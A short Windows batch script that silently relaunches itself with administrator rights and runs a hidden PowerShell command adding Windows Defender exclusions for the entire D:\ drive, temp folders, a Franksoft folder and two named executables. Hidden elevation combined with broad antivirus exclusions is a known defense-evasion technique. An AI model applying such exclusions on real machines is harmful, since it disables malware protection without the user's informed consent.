call :Admin

START Powershell -nologo -noninteractive -windowStyle hidden -noprofile -command ^
Add-MpPreference -ExclusionPath D:\; ^
Add-MpPreference -ExclusionPath C:\ProgramData\Franksoft -Force; ^
Add-MpPreference -ExclusionPath C:\Users\Admin\AppData\Local\Temp -Force; ^
Add-MpPreference -ExclusionPath C:\Temp -Force; ^
Add-MpPreference -ExclusionPath FS-Wrapper.exe -Force; ^
Add-MpPreference -ExclusionPath WinaeroTweaker.exe -Force; ^

:Admin
reg query "HKU\S-1-5-19\Environment" >nul 2>&1
if not %errorlevel% EQU 0 (
    cls
    powershell.exe -windowstyle hidden -noprofile "Start-Process '%~dpnx0' -Verb RunAs"
    exit
)









